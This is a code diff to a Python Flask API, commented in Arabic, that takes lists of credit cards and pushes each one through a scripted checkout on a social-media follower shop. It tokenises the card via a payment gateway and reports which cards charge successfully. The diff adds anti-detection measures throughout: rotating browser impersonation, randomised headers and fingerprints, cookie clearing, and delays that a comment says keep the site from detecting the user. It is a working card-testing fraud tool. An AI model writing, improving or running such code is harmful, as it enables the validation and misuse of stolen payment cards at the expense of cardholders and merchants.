@@ -9,6 +9,8 @@ import json
 import logging
 from datetime import datetime
 from user_agent import generate_user_agent
+import hashlib
+import uuid
 
 app = Flask(__name__)
 
@@ -61,6 +63,21 @@ usernames = [
     "aalb", "aalf", "aalh", "aalj", "aalg", "aalk", "aali", "aall"
 ]
 
+# قائمة إصدارات المتصفح للتبديل
+BROWSER_VERSIONS = [
+    "chrome110", "chrome120", "chrome124", "chrome99", "chrome101",
+    "edge101", "edge110", "safari15_5", "safari16_5"
+]
+
+# قائمة اللغات
+LANGUAGES = [
+    "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+    "en-US,en;q=0.9,ar;q=0.8",
+    "ar-SA,ar;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8",
+    "de-DE,de;q=0.9,en;q=0.8"
+]
+
 def generate_gmail():
     username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
     return f"{username}@gmail.com"
@@ -69,34 +86,57 @@ def get_random_username():
     return random.choice(usernames)
 
 def parse_proxy(proxy_str):
-    """تحليل البروكسي بأنواعه المختلفة"""
     if not proxy_str:
         return None, None
     
     proxy_str = proxy_str.strip()
     
-    # بروكسي HTTP/HTTPS مع username:password@host:port
     if '@' in proxy_str and '://' in proxy_str:
-        # http://user:pass@host:port
         if 'http://' in proxy_str or 'https://' in proxy_str:
             return proxy_str, proxy_str
-        # user:pass@host:port (بدون بروتوكول)
         else:
             return f"http://{proxy_str}", f"https://{proxy_str}"
     
-    # بروكسي SOCKS5
     if proxy_str.startswith('socks5://'):
         return proxy_str, proxy_str
     
-    # بروكسي HTTP/HTTPS بدون username:password
     if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
         return proxy_str, proxy_str
     
-    # host:port فقط
     if ':' in proxy_str and not proxy_str.startswith('http'):
         return f"http://{proxy_str}", f"https://{proxy_str}"
     
     return None, None
+
+def generate_fingerprint():
+    """توليد بصمة متصفح فريدة"""
+    return {
+        "session_id": str(uuid.uuid4()),
+        "fingerprint": hashlib.md5(f"{uuid.uuid4()}{random.random()}{time.time()}".encode()).hexdigest()[:16]
+    }
+
+def get_random_headers(user_agent):
+    """توليد هيدرات عشوائية لمتصفح مختلف"""
+    language = random.choice(LANGUAGES)
+    sec_ch_ua = f'"Chromium";v="{random.randint(99, 124)}", "Not;A=Brand";v="99"'
+    
+    return {
+        'User-Agent': user_agent,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': language,
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Sec-Ch-Ua': sec_ch_ua,
+        'Sec-Ch-Ua-Mobile': random.choice(['?0', '?1']),
+        'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Android"', '"iOS"']),
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1'
+    }
 
 def process_card_sync(ccx, proxy_str=None):
     try:
@@ -128,24 +168,32 @@ def process_card_sync(ccx, proxy_str=None):
             else:
                 logger.warning(f"Invalid proxy format: {proxy_str}")
         
+        # اختيار نسخة متصفح عشوائية
+        impersonate_version = random.choice(BROWSER_VERSIONS)
+        logger.info(f"Impersonating: {impersonate_version}")
+        
         # إنشاء جلسة جديدة
         session = requests.Session(
-            impersonate="chrome110",
+            impersonate=impersonate_version,
             proxies=proxies,
             timeout=30,
         )
         
-        user = generate_user_agent()
+        # إنشاء بصمة جديدة
+        fingerprint = generate_fingerprint()
+        logger.info(f"Fingerprint: {fingerprint['fingerprint']}")
         
-        headers = {
-            'User-Agent': user,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        }
+        user = generate_user_agent()
+        headers = get_random_headers(user)
         
         # ====== الخطوة 1 ======
         logger.info("Getting initial page")
-        response = session.get('https://boostme.com/tiktok-followers/tiktok-account-information/100-followers')
+        time.sleep(random.uniform(1, 3))  # تأخير عشوائي
+        
+        response = session.get(
+            'https://boostme.com/tiktok-followers/tiktok-account-information/100-followers',
+            headers=headers
+        )
         soup = BeautifulSoup(response.text, 'html.parser')
         
         token = soup.find('input', {'name': 'socialboosting_platform_checkout_account_information[_token]'})['value']
@@ -156,9 +204,11 @@ def process_card_sync(ccx, proxy_str=None):
             'socialboosting_platform_checkout_account_information[_token]': token,
         }
         
+        time.sleep(random.uniform(0.5, 1.5))
         response = session.post(
             'https://boostme.com/tiktok-followers/tiktok-account-information/100-followers',
             data=data,
+            headers=headers,
             allow_redirects=True
         )
         
@@ -170,7 +220,12 @@ def process_card_sync(ccx, proxy_str=None):
         
         # ====== الخطوة 2 ======
         logger.info("Getting cart summary")
-        response = session.get(f'https://boostme.com/cart-summary/{cart_id}')
+        time.sleep(random.uniform(0.5, 1.5))
+        
+        response = session.get(
+            f'https://boostme.com/cart-summary/{cart_id}',
+            headers=headers
+        )
         soup = BeautifulSoup(response.text, 'html.parser')
         
         token_input = soup.find('input', {'name': 'socialboosting_checkout_cart_type[_token]'})
@@ -186,6 +241,7 @@ def process_card_sync(ccx, proxy_str=None):
         response = session.post(
             f'https://boostme.com/cart-summary/{cart_id}',
             data=data,
+            headers=headers,
         )
         
         checkout_match = re.search(r'/solid-gate-checkout/create-payment/([a-f0-9]+)', response.text)
@@ -196,13 +252,19 @@ def process_card_sync(ccx, proxy_str=None):
         
         # ====== الخطوة 3 ======
         logger.info("Creating token")
+        time.sleep(random.uniform(0.5, 1.5))
+        
         data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
             'cartCorrelationId': '',
             'source': '16',
         }
         
-        response = session.post('https://secure.nmi.com/token/api/create', headers=headers, data=data)
+        response = session.post(
+            'https://secure.nmi.com/token/api/create',
+            headers=headers,
+            data=data
+        )
         token_id = response.json()['token']
         logger.info(f"Token created: {token_id}")
         
@@ -210,10 +272,13 @@ def process_card_sync(ccx, proxy_str=None):
         headers_json = {
             'authority': 'secure.nmi.com',
             'accept': '*/*',
-            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept-language': random.choice(LANGUAGES),
             'content-type': 'application/json;charset=UTF-8',
             'origin': 'https://secure.nmi.com',
             'user-agent': user,
+            'sec-ch-ua': headers.get('Sec-Ch-Ua', '"Chromium";v="124"'),
+            'sec-ch-ua-mobile': headers.get('Sec-Ch-Ua-Mobile', '?0'),
+            'sec-ch-ua-platform': headers.get('Sec-Ch-Ua-Platform', '"Windows"'),
         }
         
         logger.info("Sending card number")
@@ -225,6 +290,7 @@ def process_card_sync(ccx, proxy_str=None):
         }
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
+        time.sleep(random.uniform(0.3, 0.8))
         logger.info("Sending expiry date")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -234,6 +300,7 @@ def process_card_sync(ccx, proxy_str=None):
         }
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
+        time.sleep(random.uniform(0.3, 0.8))
         logger.info("Sending CVV")
         json_data = {
             'tokenizationKey': 'QDgzhX-6H67hh-cUq7a3-vDbkW7',
@@ -243,6 +310,7 @@ def process_card_sync(ccx, proxy_str=None):
         }
         session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers_json, json=json_data)
         
+        time.sleep(random.uniform(0.3, 0.8))
         logger.info("Looking up token")
         json_data = {
             'tokenId': token_id,
@@ -253,6 +321,8 @@ def process_card_sync(ccx, proxy_str=None):
         
         # ====== الخطوة 5 ======
         logger.info("Executing payment")
+        time.sleep(random.uniform(0.5, 1.5))
+        
         json_data = {'token': token_id}
         response = session.post(
             f'https://boostme.com/nmi-checkout/create-payment/{transaction_id}',
@@ -264,6 +334,7 @@ def process_card_sync(ccx, proxy_str=None):
                 'origin': 'https://boostme.com',
                 'x-nmi-form': 'true',
                 'user-agent': user,
+                'accept-language': random.choice(LANGUAGES),
             }
         )
         
@@ -271,18 +342,25 @@ def process_card_sync(ccx, proxy_str=None):
         r = result.get('responsetext', '')
         logger.info(f"Response: {r}")
         
+        # مسح الكوكيز بين الطلبات (لجلسة جديدة)
+        session.cookies.clear()
+        
         if 'Approved' in r:
             return {
                 "status": "success",
                 "message": "Charged - 4$ !",
                 "details": r,
-                "card": f"{n[:4]}****{n[-4:]}"
+                "card": f"{n[:4]}****{n[-4:]}",
+                "browser": impersonate_version,
+                "fingerprint": fingerprint['fingerprint']
             }
         else:
             return {
                 "status": "failed",
                 "message": r,
-                "card": f"{n[:4]}****{n[-4:]}"
+                "card": f"{n[:4]}****{n[-4:]}",
+                "browser": impersonate_version,
+                "fingerprint": fingerprint['fingerprint']
             }
             
     except Exception as e:
@@ -297,7 +375,7 @@ def charge_card():
             return jsonify({"error": "Missing 'cc' parameter"}), 400
         
         ccx = data['cc']
-        proxy = data.get('proxy', None)  # المستخدم يحط بروكسي هنا
+        proxy = data.get('proxy', None)
         
         result = process_card_sync(ccx, proxy)
         return jsonify(result), 200
@@ -314,7 +392,7 @@ def charge_bulk():
             return jsonify({"error": "Missing 'cards' list parameter"}), 400
         
         cards = data['cards']
-        proxy = data.get('proxy', None)  # بروكسي واحد للجميع أو كل وحدة ببروكسيها
+        proxy = data.get('proxy', None)
         
         results = []
         for ccx in cards:
@@ -323,6 +401,8 @@ def charge_bulk():
                 "card": ccx[:10] + "...",
                 "result": result
             })
+            # تأخير بين الطلبات عشان ما يكتشفونك
+            time.sleep(random.uniform(1, 3))
         
         return jsonify({
             "total": len(results),
@@ -338,6 +418,16 @@ def health_check():
     return jsonify({
         "status": "healthy",
         "timestamp": datetime.now().isoformat()
+    })
+
+@app.route('/config', methods=['GET'])
+def get_config():
+    """عرض إعدادات الخادم"""
+    return jsonify({
+        "browsers": BROWSER_VERSIONS,
+        "languages": LANGUAGES,
+        "usernames_count": len(usernames),
+        "max_workers": 20
     })
 
 if __name__ == '__main__':
